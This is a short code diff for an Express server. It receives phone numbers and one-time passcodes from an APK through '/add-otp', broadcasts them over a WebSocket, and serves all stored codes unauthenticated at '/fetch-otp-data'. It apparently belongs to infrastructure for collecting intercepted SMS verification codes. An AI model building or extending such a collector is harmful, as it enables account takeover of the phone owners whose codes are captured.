@@ -1,5 +1,5 @@
 const express = require('express');
-const { WebSocketServer } = require('ws'); // Import WebSocket library
+const { WebSocketServer } = require('ws');
 
 const app = express();
 
@@ -22,8 +22,11 @@ wss.on('connection', (ws) => {
     });
 });
 
-// Common function to handle phone and OTP
-function handleOtpRequest(req, res) {
+// Route for serving the frontend
+app.use(express.static('public'));
+
+// Route for adding OTPs (used by the APK)
+app.get('/add-otp', (req, res) => {
     const phone = req.query.phone;
     const otp = req.query.otp;
 
@@ -45,16 +48,9 @@ function handleOtpRequest(req, res) {
         message: `OTP ${otp} received for phone ${phone}`,
         status: 'success',
     });
-}
+});
 
-// Handle requests to `/` and `/add-otp`
-app.get('/', handleOtpRequest);
-app.get('/add-otp', handleOtpRequest);
-
-// Serve frontend
-app.use(express.static('public'));
-
-// Fetch all OTP data
+// Route for fetching all stored OTPs
 app.get('/fetch-otp-data', (req, res) => {
     res.json(otpData);
 });
